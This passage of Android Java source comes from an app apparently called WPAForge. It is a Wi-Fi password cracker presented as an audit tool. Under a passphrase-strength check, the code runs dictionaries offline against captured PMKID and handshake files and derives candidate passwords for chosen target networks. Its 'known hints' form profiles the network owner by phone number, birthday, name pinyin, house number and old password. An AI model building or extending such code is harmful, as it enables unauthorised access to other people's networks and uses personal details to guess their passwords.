        pageAudit.addView(sectionLabel(L.s("字典", "Dictionary")));
        LinearLayout dictCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);

        dictStatus = new TextView(this);
        dictStatus.setTextSize(AmberTheme.FS_TITLE);
        dictStatus.setTextColor(TEXT);
        dictStatus.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        dictStatus.setSingleLine(false);
        dictCard.addView(dictStatus);
        updateDictStatus();

        Button manage = rowAction(L.s("打开字典管理", "Manage dictionaries"));
        manage.setOnClickListener(v ->
                startActivity(new android.content.Intent(this, DictActivity.class)));
        dictCard.addView(groupDivider(10));
        dictCard.addView(manage);

        Button load = rowAction(L.s("加载字典文件", "Load dictionary file"));
        load.setOnClickListener(v -> showDictPicker());
        dictCard.addView(groupDivider(2));
        dictCard.addView(load);

        Button gen = rowAction(L.s("内置生成器（快速）", "Built-in generator (quick)"));
        gen.setOnClickListener(v -> {
            new Thread(() -> {
                DictGenerator g = DictGenerator.quick(100000);
                currentDict = g.build();
                ui.post(() -> {
                    currentDictName = L.s("内置生成器", "Built-in generator");
                    currentDictPath = "";
                    updateDictStatus();
                    appendLog(L.s("已生成 ", "Generated ") + currentDict.size() + L.s(" 条候选", " candidates"));
                    appendLog(L.s("构成: ", "Breakdown: ") + renderStats(g.stats()));
                });
            }).start();
        });
        dictCard.addView(groupDivider(2));
        dictCard.addView(gen);

        // 按 SSID 派生：审计页以前只能「加载文件」和「内置生成器」，
        // 想按目标网络现场造候选必须跑到破解页 —— 两个页面本是一件事。
        // 这里补上入口，派生结果直接成为当前字典。
        Button derive = rowAction(L.s("按目标派生（选目标）", "Derive from target (pick one)"));
        derive.setOnClickListener(v -> pickTargetForDerive());
        dictCard.addView(groupDivider(2));
        dictCard.addView(derive);
        pageAudit.addView(dictCard);

        // ---------------- 口令强度检查 ----------------
        pageAudit.addView(sectionLabel(L.s("口令强度检查", "Passphrase strength check")));
        LinearLayout checkCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);

        TextView checkHint = new TextView(this);
        checkHint.setText(L.s("输入一个口令，看它在当前字典里的位置（第几位 = 多快被猜出来）",
                "Type a passphrase to see its rank in the current dictionary"));
        checkHint.setTextSize(AmberTheme.FS_BODY);
        checkHint.setTextColor(TEXT_DIM);
        checkHint.setLineSpacing(px(4), 1f);
        checkCard.addView(checkHint);

        LinearLayout inputRow = new LinearLayout(this);
        inputRow.setOrientation(LinearLayout.HORIZONTAL);
        inputRow.setGravity(Gravity.CENTER_VERTICAL);
        LinearLayout.LayoutParams irlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        irlp.topMargin = px(10);

        EditText input = new EditText(this);
        input.setHint(L.s("口令", "Passphrase"));
        input.setTextColor(TEXT);
        input.setHintTextColor(AmberTheme.TEXT_FAINT);
        input.setTextSize(AmberTheme.FS_STATE);
        input.setSingleLine(true);
        input.setBackground(roundBgStatic(AmberTheme.SUNKEN, AmberTheme.RADIUS_CHIP));
        input.setPadding(px(14), px(12), px(14), px(12));
        inputRow.addView(input, new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        Button check = AmberTheme.action(this, dp, L.s("评估", "Check"), AmberTheme.BTN_PRIMARY);
        LinearLayout.LayoutParams cklp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        cklp.leftMargin = px(10);
        inputRow.addView(check, cklp);
        checkCard.addView(inputRow, irlp);

        auditCheckResult = new TextView(this);
        auditCheckResult.setTextSize(AmberTheme.FS_BODY);
        auditCheckResult.setTextColor(TEXT_DIM);
        auditCheckResult.setLineSpacing(px(4), 1f);
        auditCheckResult.setVisibility(View.GONE);
        checkCard.addView(auditCheckResult, topGap(10));

        check.setOnClickListener(v -> {
            String pw = input.getText().toString().trim();
            if (pw.isEmpty()) {
                Toast.makeText(this, L.s("请输入口令", "Enter a passphrase"), Toast.LENGTH_SHORT).show();
                return;
            }
            if (currentDict == null || currentDict.isEmpty()) {
                Toast.makeText(this, L.s("请先生成字典", "Load or generate a dictionary first"), Toast.LENGTH_SHORT).show();
                return;
            }
            long rank = AuditEngine.rankOf(currentDict, pw);
            // 就地显示与日志**同一条结论**（一个进日志、一个留在这里），判定语义未改
            String line = rank > 0
                    ? L.f("命中：在字典第 %d 位 —— 弱口令", "Found: rank %d — weak", rank)
                    : L.s("未命中：不在当前字典里", "Not found in the current dictionary");
            auditCheckResult.setText((rank > 0 ? "⚠ " : "✓ ") + line);
            auditCheckResult.setTextColor(rank > 0 ? DANGER : OK_GREEN);
            auditCheckResult.setVisibility(View.VISIBLE);
            if (rank > 0) {
                appendLog("命中: \"" + pw + "\" 在字典第 " + rank + " 位 —— 弱口令");
            } else {
                appendLog("未命中: \"" + pw + "\" 不在当前字典里");
            }
        });
        pageAudit.addView(checkCard);

        // ---------------- 离线校验 ----------------
        pageAudit.addView(sectionLabel(L.s("离线校验（外部材料）", "Offline check (external capture)")));

        LinearLayout offCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);

        TextView offHint = new TextView(this);
        offHint.setText(L.s(
                "材料由电脑侧抓包工具导出，手机端只做本地比对 —— 不会发起任何关联请求。\n"
                + "支持 hashcat 22000 格式（.hc22000 / .22000），放到 Download 或 Download/WPAForge-hc/ 下即可。\n"
                + "PMKID 材料只需 PBKDF2 + 一次 HMAC，比握手材料快近一倍，抓包时优先要它。",
                "Material comes from a desktop capture tool; the phone only compares locally.\n"
                + "hashcat 22000 format (.hc22000 / .22000) supported — drop it in Download or Download/WPAForge-hc/.\n"
                + "PMKID needs only PBKDF2 + one HMAC, about twice as fast as EAPOL — ask for it when capturing."));
        offHint.setTextSize(AmberTheme.FS_BODY);
        offHint.setTextColor(TEXT_DIM);
        offHint.setLineSpacing(px(5), 1f);
        offHint.setBackground(roundBgStatic(AmberTheme.SUNKEN, AmberTheme.RADIUS_CHIP));
        offHint.setPadding(px(14), px(13), px(14), px(13));
        offCard.addView(offHint);

        Button offPick = rowAction(L.s("选择材料文件，跑当前字典",
                "Pick a capture file, run the current dictionary"));
        offPick.setOnClickListener(v -> showOfflinePicker());
        offCard.addView(groupDivider(10));
        offCard.addView(offPick);

        pageAudit.addView(offCard);

        // ---------------- 运行记录 ----------------
        pageAudit.addView(sectionLabel(L.s("运行记录", "Run log")));
        LinearLayout logCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);

        auditLog = new TextView(this);
        auditLog.setTextSize(11f);
        auditLog.setTextColor(AmberTheme.TERM_FG);
        auditLog.setTypeface(Typeface.MONOSPACE);
        auditLog.setLineSpacing(px(4), 1f);
        auditLog.setBackground(roundBgStatic(AmberTheme.TERM_BG, AmberTheme.RADIUS_CHIP));
        auditLog.setPadding(px(14), px(13), px(14), px(13));
        auditLog.setMinLines(6);
        // 空状态：一块纯空白会让人以为功能坏了 —— 先说清这里会出现什么。
        auditLog.setTextColor(AmberTheme.TEXT_FAINT);
        auditLog.setText(L.s(
                "尚无记录。上面的每次操作（加载字典 / 内置生成器 / 按目标派生 / 强度评估 / 离线校验）都会写到这里。",
                "No entries yet. Every action above (load dictionary / built-in generator / derive from SSID / "
                        + "strength check / offline check) is written here."));
        logCard.addView(auditLog);
        pageAudit.addView(logCard);
    }

    // ---------------- 离线校验 ----------------

    /** 收集目录下的 22000 材料文件（只认扩展名，不递归）。 */
    private void scanHcFiles(java.io.File dir, java.util.List<java.io.File> out) {
        java.io.File[] fs = dir.listFiles();
        if (fs == null) return;
        for (java.io.File f : fs) {
            if (!f.isFile()) continue;
            String n = f.getName().toLowerCase();
            if (n.endsWith(".hc22000") || n.endsWith(".22000")) out.add(f);
        }
    }

    private void showOfflinePicker() {
        if (offlineBusy) {
            Toast.makeText(this, L.s("正在比对，等这一轮结束", "Already running"),
                    Toast.LENGTH_SHORT).show();
            return;
        }
        if (currentDict == null || currentDict.isEmpty()) {
            Toast.makeText(this, L.s("字典为空，请先加载或生成字典",
                    "Dictionary is empty - load or generate one first"), Toast.LENGTH_SHORT).show();
            return;
        }
        final java.util.List<java.io.File> files = new java.util.ArrayList<>();
        scanHcFiles(new java.io.File("/sdcard/Download"), files);
        scanHcFiles(new java.io.File("/sdcard/Download/WPAForge-hc"), files);
        if (files.isEmpty()) {
            Toast.makeText(this, L.s(
                    "没找到 .hc22000 / .22000 文件。\n把电脑导出的材料放进 Download 目录即可。",
                    "No .hc22000 / .22000 file found. Put one in the Download folder."),
                    Toast.LENGTH_LONG).show();
            return;
        }
        java.util.Collections.sort(files, (a, b) -> a.getName().compareToIgnoreCase(b.getName()));
        io.github.wlmosv_png.wpaforge.ui.NetDialog dlg = new io.github.wlmosv_png.wpaforge.ui.NetDialog(
                this, L.s("选择材料文件", "Pick a capture file"), null);
        for (java.io.File f : files) {
            final java.io.File pick = f;
            dlg.addItem(f.getName() + "  (" + Math.max(1, f.length() / 1024) + " KB)",
                    d -> runOfflineRead(pick));
        }
        dlg.show();
    }

    /** 读文件并解析材料；多条时让用户挑一条，避免一次跑很久。 */
    private void runOfflineRead(final java.io.File f) {
        appendLog(L.s("读取材料: ", "Reading: ") + f.getName());
        new Thread(() -> {
            String text;
            try {
                text = readTextFile(f);
            } catch (Throwable t) {
                ui.post(() -> appendLog(L.s("读取失败: ", "read failed: ") + t));
                return;
            }
            final java.util.List<io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry> entries =
                    io.github.wlmosv_png.wpaforge.audit.Hc22000.parse(text);
            ui.post(() -> {
                if (entries.isEmpty()) {
                    appendLog(L.s("文件里没有可用材料（需要 PMKID，或含 MIC 的 EAPOL 帧）",
                            "No usable material (need a PMKID, or an EAPOL frame with MIC)"));
                    return;
                }
                int pmkid = 0;
                for (io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry e : entries) {
                    if (e.isPmkid()) pmkid++;
                }
                appendLog(L.f("找到 %d 条材料（其中 PMKID %d 条）",
                        "Found %d material entries (%d PMKID)", entries.size(), pmkid));
                if (entries.size() > 1) {
                    io.github.wlmosv_png.wpaforge.ui.NetDialog pick = new io.github.wlmosv_png.wpaforge.ui.NetDialog(
                            this, L.f("选择材料（%d 条）", "Pick material (%d)", entries.size()), null);
                    for (io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry e : entries) {
                        final io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry chosen = e;
                        pick.addItem(e.label(), d -> runOfflineOne(chosen));
                    }
                    pick.show();
                } else {
                    runOfflineOne(entries.get(0));
                }
            });
        }, "wpaforge-offline-read").start();
    }

    /** 对一条材料跑当前字典。 */
    private void runOfflineOne(final io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry e) {
        final java.util.List<io.github.wlmosv_png.wpaforge.audit.Candidate> dict = currentDict;
        if (dict == null || dict.isEmpty()) {
            Toast.makeText(this, L.s("字典为空", "Dictionary is empty"), Toast.LENGTH_SHORT).show();
            return;
        }
        offlineBusy = true;
        appendLog(L.s("开始比对: ", "Comparing: ") + e.label() + " · " + dict.size() + L.s(" 条候选", " candidates"));
        final long t0 = System.currentTimeMillis();
        final int every = Math.max(1, dict.size() / 10);
        new Thread(() -> {
            final io.github.wlmosv_png.wpaforge.audit.AuditEngine engine =
                    new io.github.wlmosv_png.wpaforge.audit.AuditEngine();
            io.github.wlmosv_png.wpaforge.audit.AuditEngine.Progress cb =
                    new io.github.wlmosv_png.wpaforge.audit.AuditEngine.Progress() {
                @Override public void onProgress(long tested, long total, String found) {
                    if (tested % every == 0) {
                        final long t = tested, n = total;
                        ui.post(() -> appendLog("  " + t + " / " + n));
                    }
                }
                @Override public void onDone(io.github.wlmosv_png.wpaforge.audit.AuditEngine.Result r) {
                    final long ms = System.currentTimeMillis() - t0;
                    ui.post(() -> {
                        offlineBusy = false;
                        if (r.hit) {
                            appendLog(L.s("⚡ 命中: ", "HIT: ")
                                    + io.github.wlmosv_png.wpaforge.ui.Redact.pw(r.hitPassword)
                                    + L.s("（字典第 ", " (index ") + r.hitIndex
                                    + L.s(" 位，耗时 ", "), took ") + ms + " ms)");
                        } else {
                            appendLog(L.s("未命中：跑了 ", "No hit: tested ") + r.tested
                                    + L.s(" 条，耗时 ", " in ") + ms + " ms");
                        }
                    });
                }
                @Override public void onError(String message) {
                    ui.post(() -> {
                        offlineBusy = false;
                        appendLog(L.s("材料不完整: ", "Bad material: ") + message);
                    });
                }
            };
            if (e.isPmkid()) {
                engine.runPmkid(io.github.wlmosv_png.wpaforge.audit.Hc22000.toPmkid(e), dict, cb);
            } else {
                engine.runHandshake(io.github.wlmosv_png.wpaforge.audit.Hc22000.toHandshake(e), dict, cb);
            }
        }, "wpaforge-offline-run").start();
    }

    /** 读文本文件（材料文件都是纯文本，限制 4 MB 防止误选大文件）。 */
    private static String readTextFile(java.io.File f) throws Exception {
        int cap = (int) Math.min(Math.max(f.length(), 1L), 4L * 1024 * 1024);
        byte[] buf = new byte[cap];
        try (java.io.FileInputStream in = new java.io.FileInputStream(f)) {
            int off = 0, n;
            while (off < buf.length && (n = in.read(buf, off, buf.length - off)) > 0) off += n;
            return new String(buf, 0, off, java.nio.charset.StandardCharsets.UTF_8);
        }
    }

    /**
     * 回到前台时检查：后台期间引擎是不是被系统挂起过。
     *
     * <p>判据：任务在跑，但最近一次心跳距今超过 90 秒 —— 说明中间一段时间
     * 引擎完全没推进。实测（ColorOS 15）后台会限制应用，表现为 su 命令卡住、
     * 引擎线程阻塞在管道读上，界面上看起来像「任务停了，回到应用才继续」。
     */
    private void checkBackgroundStall() {
        try {
            CrackService svc = liveService();
            if (svc == null || !svc.isWorking()) return;
            long last = Prefs.lastBeat(this);
            if (last <= 0) return;
            long gap = System.currentTimeMillis() - last;
            if (gap > 90_000L) {
                appendStreamColored(L.s(
                        "检测到后台期间任务被系统挂起过（约 " + (gap / 1000) + " 秒没有推进）。"
                        + "若反复出现，请到设置页看「保活状态」。",
                        "Background stall detected (~" + (gap / 1000) + "s without progress). "
                        + "See \"Keep-alive status\" in Settings if it repeats."), DANGER);
            }
        } catch (Throwable ignored) {}
    }

    /** 刷新「保活状态」卡片 */
    private void refreshKeepAlive() {
        if (keepAliveLabel == null) return;
        boolean batteryOk = false;
        try {
            android.os.PowerManager pm = (android.os.PowerManager)
                    getSystemService(android.content.Context.POWER_SERVICE);
            if (pm != null) batteryOk = pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Throwable ignored) {}
        StringBuilder sb = new StringBuilder();
        sb.append(batteryOk ? "✓" : "✗")
                .append(L.s(" 电池优化豁免（关屏后不被限制）\n",
                        " battery-optimisation exemption (no throttling with screen off)\n"));
        sb.append(CrackService.isRunning() ? "✓" : "·")
                .append(L.s(" 前台服务（任务运行时自动开启）\n",
                        " foreground service (starts with the task)\n"));
        sb.append("·").append(L.s(" 系统深度睡眠白名单：任务启动时自动写入（需要 root）\n",
                " OS deep-sleep whitelist: written automatically at task start (needs root)\n"));
        keepAliveLabel.setText(sb.toString());
    }

    private void updateDictStatus() {
        if (dictStatus == null) return;
        int n = dictCount();
        if (n == 0) {
            dictStatus.setText(L.s("当前字典: 未选择", "Current dictionary: none"));
            return;
        }
        String skip = (currentDictSkipped > 0)
                ? L.s("（其中 " + currentDictSkipped + " 条本目标跑过，将自动跳过）",
                      " (" + currentDictSkipped + " already tried here \u2014 will be skipped)")
                : "";
        dictStatus.setText(L.s("当前字典: ", "Current dictionary: ")
                + sourceLabel(currentDictSource) + " · " + n + L.s(" 条", " entries") + skip);
    }

    /**
     * 破解页的「字典来源」。四个来源做成一屏**可点卡片**。
     *
     * 用户原话：「那个选择字典文件，不知道的人还以为不是个选项呢」。
     * 所以这一屏要同时回答三件事：
     *   ① 这行能不能点 —— 每行右侧自绘 `›`，不是纯文字
     *   ② 现在用的是哪个 —— 选中行换琥珀底 + 琥珀 `✓` + 琥珀标题，
     *      外加顶部一行「当前: …」
     *   ③ 点了会发生什么 —— 副标题给**真实条数与预计耗时**
     *      （三种方式的代价差几十倍：几十条 vs 一千七百多条，以前一个字都没提）
     *
     * 图标全部来自 {@link DictIcons}，Canvas 自绘，不依赖 emoji 字体。
     */
    private void showDictSource() {
        final io.github.wlmosv_png.wpaforge.audit.ProfileStore.Pick pick = profileForCurrentTarget();
        final io.github.wlmosv_png.wpaforge.audit.SeedModel cur = pick.seeds;
        final int budget = Prefs.deriveBudget(this);
        final io.github.wlmosv_png.wpaforge.audit.TriedSet tried = triedForCurrentTarget();

        // 画像能出多少条：拿真实实现算一次（几毫秒），没有目标就用占位目标
        int seedCount = 0;
        try {
            io.github.wlmosv_png.wpaforge.core.NetRecord t = targetNet != null
                    ? targetNet
                    : new io.github.wlmosv_png.wpaforge.core.NetRecord("sample",
                            "00:00:00:00:00:00", -60, 2432,
                            io.github.wlmosv_png.wpaforge.core.NetRecord.Security.WPA2, false, "");
            seedCount = io.github.wlmosv_png.wpaforge.audit.TargetDictBuilder.build(
                    t, budget, null, cur,
                    io.github.wlmosv_png.wpaforge.audit.CnHot.load(this)).candidates.size();
        } catch (Throwable ignored) {}
        final int generic = genericDictSize();

        io.github.wlmosv_png.wpaforge.ui.NetDialog d =
                new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                        L.s("用什么密码字典", "Which password source"),
                        L.s("先填线索最划算：实测命中有一半发生在第 1 条。",
                                "Fill hints first \u2014 half of the real hits landed on candidate #1."));
        d.addHint(L.s("当前: ", "Now: ") + sourceLabel(currentDictSource)
                + (dictCount() > 0 ? " · " + dictCount() + L.s(" 条", " entries") : "")
                + "\n" + L.s("本目标: ", "This target: ")
                + (Prefs.targetLabel(this).isEmpty() ? L.s("未选择网络", "no network picked")
                        : Prefs.targetLabel(this))
                + (tried.size() > 0
                        ? L.s(" · 已试过 " + tried.size() + " 条（会自动跳过）",
                              " \u00b7 " + tried.size() + " already tried (auto-skipped)")
                        : ""));

        d.addIconItem(DictIcons.Kind.PROFILE,
                L.s("已知密码线索", "Known hints"),
                (cur.isEmpty()
                        ? L.s("还没填。手机号 / 生日 / 姓名拼音 / 门牌 —— 最值钱的一步",
                                "Not filled. Phone / birthday / pinyin / floor \u2014 best payoff")
                        : L.f("已填 %d 项 · 可出 %d 条", "%d filled \u00b7 %d candidates",
                                cur.count(), seedCount))
                        ,
                false,
                dd -> showSeedDialog());

        d.addIconItem(DictIcons.Kind.TARGET,
                L.s("按目标派生（推荐）", "Derive from target (recommended)"),
                (cur.isEmpty()
                        ? L.s("还没填线索，只会出通用词表", "No hints \u2014 generic list only")
                        : L.s("线索 + 通用弱口令现场生成", "Hints + common weak lists, built on the fly"))
                        + " · " + seedCount + L.s(" 条 · 约 ", " entries \u00b7 ~")
                        + Prefs.estimate(this, seedCount),
                SRC_PROFILE.equals(currentDictSource),
                dd -> deriveFromTarget());

        d.addIconItem(DictIcons.Kind.FILE,
                L.s("用自己的字典文件", "Use your own wordlist"),
                L.s("从手机里挑一份现成的词表", "Pick an existing wordlist from the phone")
                        + (tried.size() > 0
                                ? L.s(" · 跑过的会自动跳过", " \u00b7 already-tried skipped") : ""),
                SRC_FILE.equals(currentDictSource),
                dd -> showDictPicker());

        d.addIconItem(DictIcons.Kind.GENERIC,
                L.s("通用弱口令表", "Generic weak list"),
                L.s("不看目标", "Target-agnostic") + " · " + generic + L.s(" 条 · 约 ", " entries \u00b7 ~")
                        + Prefs.estimate(this, generic),
                SRC_GENERIC.equals(currentDictSource),
                dd -> buildGenericDict());

        d.addItem(L.s("怎么选？看说明", "Which one? Read this"), dd -> showDictGuide());
        d.setNegative(L.s("关闭", "Close"), null);
        d.show();

        // 第一次进来先给一次说明 —— 用户提的问题本质就是"没人告诉我怎么来"
        if (!Prefs.dictGuideSeen(this)) {
            Prefs.setDictGuideSeen(this);
            showDictGuide();
        }
    }

    /**
     * 取"当前目标该用哪份线索"。
     *
     * 优先本目标档案；没有就从默认模板继承（**旧口令不继承**，见 ProfileStore.inherit）。
     * 返回的 fromTemplate 用来在界面和日志里显式说明"这不是本目标专用"。
     */
    /**
     * 当前目标键（**全应用唯一入口**）。
     *
     * 踩过的坑：保存和清空各算了一次 key，保存回退到 targetNet 算出来的键、
     * 清空直接用 SharedPreferences 里的值 —— 后者为空时去删 `unknown.seeds`，
     * 文件根本没删掉，用户看到的就是"清空了再打开内容还在"。
     * 现在只留这一个算法，并且算出来就写回去（自愈）。
     */
    private String currentTargetKey() {
        String key = Prefs.targetKey(this);
        if (key != null && !key.isEmpty()) return key;
        if (targetNet == null) return "";
        key = io.github.wlmosv_png.wpaforge.audit.TriedSet.targetKey(
                targetNet.bssid, targetNet.ssid);
        if (!key.isEmpty() && !"unknown".equals(key)) {
            Prefs.setTarget(this, targetNet.bssid, targetNet.ssid);   // 自愈：写回
        }
        return key;
    }

    private io.github.wlmosv_png.wpaforge.audit.ProfileStore.Pick profileForCurrentTarget() {
        return io.github.wlmosv_png.wpaforge.audit.ProfileStore.pick(this, currentTargetKey());
    }

    /** 本目标的已试集合（界面预览用；不存在就是空的） */
    private io.github.wlmosv_png.wpaforge.audit.TriedSet triedForCurrentTarget() {
        String key = currentTargetKey();
        if (key == null || key.isEmpty()) return new io.github.wlmosv_png.wpaforge.audit.TriedSet();
        return io.github.wlmosv_png.wpaforge.audit.TriedSet.load(
                io.github.wlmosv_png.wpaforge.audit.TriedSet.fileFor(this, key));
    }

    /** 换目标后重算"将跳过多少条" —— 否则显示的还是上一个目标的数字 */
    private void refreshSkippedForCurrentDict() {
        currentDictSkipped = countSkipped(currentDict);
        updateDictStatus();
    }

    /** 这份候选里有多少条本目标已经跑过（会显示在界面上） */
    private int countSkipped(java.util.List<Candidate> list) {
        if (list == null || list.isEmpty()) return 0;
        io.github.wlmosv_png.wpaforge.audit.TriedSet t = triedForCurrentTarget();
        if (t.size() == 0) return 0;
        int n = 0;
        for (Candidate c : list) if (t.contains(c.password)) n++;
        return n;
    }

    /** 来源代码 → 显示文案 */
    private String sourceLabel(String code) {
        if (SRC_PROFILE.equals(code)) return L.s("画像派生", "profile-derived");
        if (SRC_GENERIC.equals(code)) return L.s("通用弱口令表", "generic weak list");
        if (SRC_FILE.equals(code)) return L.s("字典文件", "dictionary file");
        return L.s("未选择", "none");
    }

    /** 通用生成器条数（内容确定，缓存一次） */
    private int genericDictSize() {
        if (genericDictCount <= 0) {
            genericDictCount = DictGenerator.quick(200000).build().size();
        }
        return genericDictCount;
    }

    /**
     * 「字典怎么选」说明。
     *
     * 关键是**顺序**：现在用户看到的是四个平级选项，不知道先干哪个。
     * 这里明确说"先填线索、再派生、没线索才用通用表"，并把代价摆出来。
     */
    private void showDictGuide() {
        io.github.wlmosv_png.wpaforge.ui.NetDialog d =
                new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                        L.s("字典怎么选？", "How to choose"),
                        L.s("① 先填「已知密码线索」\n"
                                        + "手机号、生日、姓名拼音、门牌。这些东西任何词表里都没有，"
                                        + "填了就直接排在候选最前面。\n\n"
                                        + "② 再点「按目标派生」\n"
                                        + "它把线索和通用弱口令拼在一起，通常几十条、几分钟跑完。\n\n"
                                        + "③ 没有线索也行\n"
                                        + "那就点「通用弱口令表」。但那是一千七百多条，要跑一个多小时。\n\n"
                                        + "④ 已经收集了字典文件\n"
                                        + "选「用自己的字典文件」，直接加载。",
                                "1) Fill in \"Known hints\" first\n"
                                        + "Phone, birthday, pinyin, floor. No wordlist has these, "
                                        + "and they go straight to the front of the queue.\n\n"
                                        + "2) Then tap \"Derive from target\"\n"
                                        + "It combines your hints with common weak lists \u2014 "
                                        + "usually a few dozen candidates, a few minutes.\n\n"
                                        + "3) No hints? That is fine\n"
                                        + "Use \"Generic weak list\" \u2014 but that is ~1700 entries, "
                                        + "over an hour.\n\n"
                                        + "4) Already have a wordlist file\n"
                                        + "Pick \"Use your own wordlist\" and load it directly."));
        d.setNegative(L.s("知道了", "Got it"), null);
        d.setPositive(L.s("去填线索", "Fill hints"), dd -> showSeedDialog());
        d.show();
    }

    /**
     * 「已知密码线索」录入（社会工程学画像）。
     *
     * 设计依据：CUPP(6.6k★) / elpscrk(964★) 这些主流工具都只问"关于这个人你知道什么"，
     * 然后把信息**互相组合**，而不是对某一串数字做变形。
     * 所以这里问的每一项，都是"人会真的写进密码里的东西"。
     *
     * 全部可留空；留空时派生行为与旧版本一致。
     * 只存本机私有 SP，日志与界面一律走掩码。
     */
    private void showSeedDialog() {
        final String key = currentTargetKey();
        final io.github.wlmosv_png.wpaforge.audit.ProfileStore.Pick pick = profileForCurrentTarget();
        final io.github.wlmosv_png.wpaforge.audit.SeedModel cur = pick.seeds;

        String origin;
        if (pick.hasOwn && cur.isEmpty()) {
            origin = L.s("这个网标记为「不用线索」。", "Marked as \"no hints\" for this network.");
        } else if (pick.hasOwn) {
            origin = L.s("只对下面这个网生效。", "Only applies to the network at the bottom.");
        } else {
            origin = L.s("还没填过。填进去的会排在候选最前面。",
                    "Empty for now. What you fill in goes to the front of the queue.");
        }

        io.github.wlmosv_png.wpaforge.ui.NetDialog d =
                new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                        L.s("已知密码线索", "Known password hints"),
                        origin + "\n" + L.s("只存本机、不联网、不上传。",
                                "Stored on device only, never uploaded."));

        final android.widget.EditText phone = d.addField(
                L.s("手机号，多个用逗号分开（最多 4）", "Phone number(s), comma separated (max 4)"),
                joinComma(cur.phones));
        final android.widget.EditText names = d.addField(
                L.s("姓名/昵称拼音，多个用逗号（zhangwei,xiaobao）",
                        "Name/nickname pinyin, comma separated"),
                joinComma(cur.names));
        final android.widget.EditText bday = d.addField(
                L.s("生日 19900101 / 900101 / 0101", "Birthday 19900101 / 900101 / 0101"),
                cur.birthday);
        final android.widget.EditText house = d.addField(
                L.s("门牌 / 楼层 / 房间号", "House / floor / room no."),
                cur.houseNo);
        final android.widget.EditText landline = d.addField(
                L.s("宽带账号或固话", "Broadband account / landline"),
                cur.landline);
        final android.widget.EditText oldPw = d.addField(
                L.s("这个网以前用过的口令", "This network's previous password"),
                cur.oldPassword);
        final android.widget.EditText custom = d.addField(
                L.s("其他常出现的词，逗号分开", "Other words you'd expect, comma separated"),
                joinComma(cur.customs));
        d.addHint(L.s("留空即只按通用弱口令+中文高频派生。",
                "Leave blank to derive from common + Chinese weak lists only."));

        final boolean[] ssidOn = {cur.useSsid};
        final android.widget.TextView[] ssidRow = new android.widget.TextView[1];
        ssidRow[0] = d.addItem(ssidToggleLabel(ssidOn[0]), dd -> {
            ssidOn[0] = !ssidOn[0];
            ssidRow[0].setText(ssidToggleLabel(ssidOn[0]));
        });

        // 在编辑哪个网写在**底部**小字里：它是必要信息（否则不知道改的是谁的档案），
        // 但不该抢顶部的位置 —— 用户明确说过不希望在标题那行看到 wifi 名字。
        if (!Prefs.targetLabel(this).isEmpty()) {
            d.addHint(L.s("正在编辑: ", "Editing: ") + Prefs.targetLabel(this));
        }

        d.setNegative(L.s("清空本目标", "Clear this target"), dd -> {
            String k = key == null || key.isEmpty() ? currentTargetKey() : key;
            io.github.wlmosv_png.wpaforge.audit.ProfileStore.clearTarget(this, k);
            appendStream(L.s("已清空本目标的线索（这个网不会再自动套用任何内容）。",
                    "Cleared hints for this target (nothing will be auto-filled here again)."));
            updateDictStatus();
        });
        d.setPositive(L.s("保存", "Save"), dd -> {
            io.github.wlmosv_png.wpaforge.audit.SeedModel m =
                    readSeedForm(phone, names, bday, house, landline, oldPw, custom, ssidOn[0]);
            final String k = key == null || key.isEmpty() ? currentTargetKey() : key;
            io.github.wlmosv_png.wpaforge.audit.ProfileStore.saveTarget(this, k, m);

            io.github.wlmosv_png.wpaforge.audit.TriedSet tried = triedForCurrentTarget();
            io.github.wlmosv_png.wpaforge.audit.TargetDictBuilder.Result probe =
                    io.github.wlmosv_png.wpaforge.audit.TargetDictBuilder.build(
                            targetNet == null
                                    ? new io.github.wlmosv_png.wpaforge.core.NetRecord(
                                            "sample", "00:00:00:00:00:00", -60, 2432,
                                            io.github.wlmosv_png.wpaforge.core.NetRecord.Security.WPA2,
                                            false, "")
                                    : targetNet,
                            Prefs.deriveBudget(this),
                            null, m, io.github.wlmosv_png.wpaforge.audit.CnHot.load(this));
            int skipped = 0;
            for (Candidate c : probe.candidates) if (tried.contains(c.password)) skipped++;

            appendStream(m.isEmpty()
                    ? L.s("线索已清空", "Hints cleared")
                    : L.f("线索已保存 %d 项: %s", "Saved %d hint(s): %s", m.count(), m.masked()));
            appendStream(L.f("按线索可生成 %d 条候选（预算 %d）",
                    "%d candidates from hints (budget %d)",
                    probe.candidates.size(), Prefs.deriveBudget(this)));
            if (skipped > 0) {
                appendStream(L.f("其中 %d 条本目标已试过，跑的时候会自动跳过。",
                        "%d already tried on this target \u2014 skipped automatically.", skipped));
            }
            if (!m.isEmpty()) {
                appendStream(L.s("线索已变，请重新「按目标派生」后入队。",
                        "Hints changed \u2014 derive again before queueing."));
            }
            updateDictStatus();
        });
        d.show();
    }

    /** 把表单读成一个 SeedModel（保存与"设为模板"共用一份读法，避免两处不一致） */
    private static io.github.wlmosv_png.wpaforge.audit.SeedModel readSeedForm(
            android.widget.EditText phone, android.widget.EditText names,
            android.widget.EditText bday, android.widget.EditText house,
            android.widget.EditText landline, android.widget.EditText oldPw,
            android.widget.EditText custom, boolean useSsid) {
        io.github.wlmosv_png.wpaforge.audit.SeedModel m =
                new io.github.wlmosv_png.wpaforge.audit.SeedModel();
        for (String p : splitComma(phone.getText().toString())) {
            io.github.wlmosv_png.wpaforge.audit.SeedModel.addPhone(m, p);
        }
        for (String n : splitComma(names.getText().toString())) {
            io.github.wlmosv_png.wpaforge.audit.SeedModel.addName(m, n);
        }
